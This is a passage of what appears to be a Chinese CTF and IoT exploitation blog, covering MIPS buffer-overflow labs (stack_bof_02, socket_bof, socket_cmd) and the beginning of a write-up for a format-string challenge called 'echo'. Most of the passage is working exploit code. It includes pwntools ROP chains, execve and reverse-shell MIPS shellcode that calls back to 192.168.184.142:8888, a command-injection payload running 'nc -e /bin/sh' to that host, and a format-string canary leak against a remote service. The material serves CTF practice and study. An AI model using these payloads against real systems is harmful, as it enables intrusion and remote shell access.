class="hljs-variable">$s3</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_sC</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFFC <span class="hljs-number">20</span> <span class="hljs-number">00</span> B2 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s2</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s8</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B000 <span class="hljs-number">1</span>C <span class="hljs-number">00</span> B1 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s1</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s4</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B004 <span class="hljs-number">18</span> <span class="hljs-number">00</span> B0 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s0</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s0</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B008 <span class="hljs-number">08</span> <span class="hljs-number">00</span> E0 <span class="hljs-number">03</span>                   jr      <span class="hljs-variable">$ra</span><br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B00C <span class="hljs-number">40</span> <span class="hljs-number">00</span> BD <span class="hljs-number">27</span>                   addiu   <span class="hljs-variable">$sp</span>, <span class="hljs-number">0</span>x40<br></code></pre></td></tr></table></figure><p>再使用mipsrop.find(“li $a0,1”)找到相应的gadget，将$a0赋值为1，作为sleep函数的参数，如果$a0本身就存在值也可以不用这个操作，可能sleep的时间会长一点：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB10 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>                   li      $a0, <span class="hljs-number">1</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB14 <span class="hljs-number">21</span> C8 <span class="hljs-number">20</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move</span>    $t9, $s1<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB18 <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br></code></pre></td></tr></table></figure><p>调用sleep函数后还需要进一步调用shellcode，所以给$a0赋值值后不能直接去执行sleep函数，这里要进一步调用xdr_union函数结尾部分，执行完sleep函数后可以继续沿着ROP链执行：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C34 <span class="hljs-number">21</span> C8 <span class="hljs-number">60</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">s3</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C38 <span class="hljs-number">2</span>C <span class="hljs-number">00</span> <span class="hljs-keyword">BF </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x18</span>+var_s14($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C3C <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B4 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s4</span>, <span class="hljs-number">0x18</span>+var_s10($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C40 <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B3 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s3</span>, <span class="hljs-number">0x18</span>+var_sC($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C44 <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B2 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s2</span>, <span class="hljs-number">0x18</span>+var_s8($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C48 <span class="hljs-number">1</span>C <span class="hljs-number">00</span> <span class="hljs-keyword">B1 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s1</span>, <span class="hljs-number">0x18</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C4C <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B0 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s0</span>, <span class="hljs-number">0x18</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C50 <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   <span class="hljs-keyword">jr </span>     $<span class="hljs-built_in">t9</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C54 <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-keyword">BD </span><span class="hljs-number">27</span>                   <span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, <span class="hljs-number">0x30</span><br></code></pre></td></tr></table></figure><p>最后使用mipsrop.stackfinders()找到获取栈地址的相对偏移的gadget；使用mipsrop.tail()或mipsrop.find(“”)找到跳转地址的gadget，通过偏移量写入shellcode，找出如下gadget：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.text:<span class="hljs-number">0001B230</span> <span class="hljs-number">21</span> C8 <span class="hljs-number">00</span> <span class="hljs-number">02</span>                   move    $t9, $s0<br>.text:<span class="hljs-number">0001B234</span> <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.text:<span class="hljs-number">0001B238</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x38</span>+var_10<br><br>.text:<span class="hljs-number">000214A0</span> <span class="hljs-number">21</span> C8 <span class="hljs-number">80</span> <span class="hljs-number">00</span>                   move    $t9, $a0<br>.text:<span class="hljs-number">000214A4</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> A2 AF                   sw      $v0, <span class="hljs-number">0x30</span>+var_18($sp)<br>.text:<span class="hljs-number">000214A8</span> <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.text:<span class="hljs-number">000214AC</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x30</span>+var_18<br></code></pre></td></tr></table></figure><p>​                             </p><p>完整的ROP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>libcbase = <span class="hljs-number">0x3fee5000</span><br><br>_sleep = libcbase + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    slti $a2, $zero, -1</span><br><span class="hljs-string">    li $t7, 0x69622f2f</span><br><span class="hljs-string">    sw $t7, -12($sp)</span><br><span class="hljs-string">    li $t6, 0x68732f6e</span><br><span class="hljs-string">    sw $t6, -8($sp)</span><br><span class="hljs-string">    sw $zero, -4($sp)</span><br><span class="hljs-string">    la $a0, -12($sp)</span><br><span class="hljs-string">    slti $a1, $zero, -1</span><br><span class="hljs-string">    li $v0, 4011</span><br><span class="hljs-string">    syscall 0x40404</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>payload =  <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1fc</span> + p32(libcbase + <span class="hljs-number">0xafe0</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s0</span><br>payload += p32(libcbase + <span class="hljs-number">0x21c34</span>)    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>     <span class="hljs-comment">#s2</span><br>payload += p32(_sleep)    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#fp</span><br>payload += p32(libcbase + <span class="hljs-number">0x2fb10</span>)    <span class="hljs-comment">#ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += p32(libcbase + <span class="hljs-number">0x214a0</span>)    <span class="hljs-comment">#s0</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += p32(libcbase + <span class="hljs-number">0x1b230</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += shellcode<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(payload)<br></code></pre></td></tr></table></figure><p>最后调用该payload</p><img src="/img/5/Screenshot_20221111_032920.png" style="zoom:67%;" /><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>H4lo师傅第一个版本的ROP通过mipsrop.stackfinders()是找到 <code>0x000171CC</code> 这一处的 gadget：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>CC <span class="hljs-number">18</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x38</span>+var_20<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D0 <span class="hljs-number">21</span> C8 <span class="hljs-number">60</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move</span>    $t9, $s3<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D4 <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">24</span>                   li      $a1, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>最后也是通过<code>0x000214A0</code> 的gadget跳转到shellcode，<code>0x000171CC</code> 处的 gadget获取栈地址的相对偏移是sp + 0x18，并依此写入0x18字节的数据填充，然后写入shellcode，而<code>0x000214A0</code> 处会有<code>sw   $v0, 0x18($sp)</code>的操作，最后会将shellcode的前4位字节赋值为$v0寄存器的值，如下图：</p><img src="/img/5/Screenshot_20221110_053319.png" style="zoom: 80%;" /><p>虽然最后也可以成功执行shellcode，但是对于后面的socket_bof这种题就无法成功；所以最好继续多写入4字节的数据填充，然后写入shellcode，这样就不会让shellcode上的数据被修改。</p><p>不过H4lo师傅第二个版本的ROP就没有使用该处的gadget。</p><h3 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h3><p>使用ida查看伪代码：</p><p><img src="/img/5/Screenshot_20221111_090157.png"></p><p>read函数输入字符到v10上后，再由sprintf函数将v10的字符加上“nom nom nom, you sent me ”这串字符一同复制到v11上，最后的溢出也是v11的溢出，所以在调试时在栈上应找到如下地址去计算溢出长度：</p><img src="/img/5/Screenshot_20221111_093723.png" style="zoom: 80%;" /><p>溢出后的ROP可以直接使用上一题stack_bof_02的，最后将shellcode改为可以反弹shell的代码。</p><p>可以参考shell-storm上的<a href="http://shell-storm.org/shellcode/files/shellcode-860.html">代码</a>，再改一下ip和端口即可</p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>libcbase = <span class="hljs-number">0x3fee5000</span><br>_sleep = libcbase + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    slti $a0, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a0, $zero, 0x1111</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFFD</span><br><span class="hljs-string">    not $a0, $t4</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFFD</span><br><span class="hljs-string">    not $a0, $t4</span><br><span class="hljs-string">    not $a1, $t4</span><br><span class="hljs-string">    slti $a2, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4183</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    andi $a0, $v0, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4041</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string">    li $v0, 4041</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $a1, 0xB821 # Port: 8888</span><br><span class="hljs-string">    ori $a1, 0xFF01</span><br><span class="hljs-string">    addi $a1, $a1, 0x0101</span><br><span class="hljs-string">    sw $a1, -8($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $a1, 0x8EB8A8C0 # IP: 192.168.184.142</span><br><span class="hljs-string">    sw $a1, -4($sp)</span><br><span class="hljs-string">    addi $a1, $sp, -8</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFEF</span><br><span class="hljs-string">    not $a2, $t4</span><br><span class="hljs-string">    li $v0, 4170</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $t0, 0x6962</span><br><span class="hljs-string">    ori $t0, $t0,0x2f2f</span><br><span class="hljs-string">    sw $t0, -20($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $t0, 0x6873</span><br><span class="hljs-string">    ori $t0, 0x2f6e</span><br><span class="hljs-string">    sw $t0, -16($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a3, $zero, 0xFFFF</span><br><span class="hljs-string">    sw $a3, -12($sp)</span><br><span class="hljs-string">    sw $a3, -4($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    addi $a0, $sp, -20</span><br><span class="hljs-string">    addi $t0, $sp, -20</span><br><span class="hljs-string">    sw $t0, -8($sp)</span><br><span class="hljs-string">    addi $a1, $sp, -8</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    addiu $sp, $sp, -20</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a2, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4011</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">51</span> + p32(libcbase + <span class="hljs-number">0xafe0</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s0</span><br>payload += p32(libcbase + <span class="hljs-number">0x21c34</span>)    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>     <span class="hljs-comment">#s2</span><br>payload += p32(_sleep)    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#fp</span><br>payload += p32(libcbase + <span class="hljs-number">0x2fb10</span>)    <span class="hljs-comment">#ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += p32(libcbase + <span class="hljs-number">0x214a0</span>)    <span class="hljs-comment">#s0</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += p32(libcbase + <span class="hljs-number">0x1b230</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += shellcode<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>执行exp</p><p><img src="/img/5/Screenshot_20221111_090644.png"></p><h3 id="socket-cmd"><a href="#socket-cmd" class="headerlink" title="socket_cmd"></a>socket_cmd</h3><p>使用snprintf函数，控制大小为0x64，程序无栈溢出漏洞。将v10的字符直接拿去和“echo ”拼接后去作为system的参数，然后输出字符串；可以使用‘&amp;’字符，当执行完输出后继续执行自己写入的命令。</p><p><img src="/img/5/Screenshot_20221112_023231.png"></p><p>就有如下exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>cmd = <span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a &amp;&#x27;</span> + cmd<br>p.sendafter(<span class="hljs-string">b&#x27;Send me a string:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>也可以反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>cmd = <span class="hljs-string">b&#x27;nc -e /bin/sh 192.168.184.142 8888&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a &amp;&#x27;</span> + cmd<br>p.sendafter(<span class="hljs-string">b&#x27;Send me a string:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>执行后：<br><img src="/img/5/Screenshot_20221112_023610.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022天津市大学生信息安全网络攻防决赛 pwn</title>
    <link href="/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/"/>
    <url>/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<p>比赛时间只有3个小时，这里我只写出了echo、hero，还一道choice没时间去写了，后续自己在本地复现了一下。</p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>格式化字符串漏洞</p><p><img src="/img/3/Screenshot_20221105_115756.png"></p><p>先利用格式字符串读出canary的值绕过检查</p><p>利用格式字符串修改0x601068地址的值，修改为字符串<code>/bin/sh\x00</code></p><p>再利用栈溢出和system函数执行ROP</p><p><img src="/img/3/Screenshot_20221105_121837.png"></p><p>开始我想一次性修改多个字节，但好像有canary以及缓冲区太小的原因，当时一直不成功，所以就每次只修改一个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;echo&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./echo&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50004</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>bss = <span class="hljs-number">0x601068</span><br><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;%11$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>bin_sh = <span class="hljs-number">0x0068732f6e69622f</span><br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%98c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">1</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%105c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">2</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%110c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span 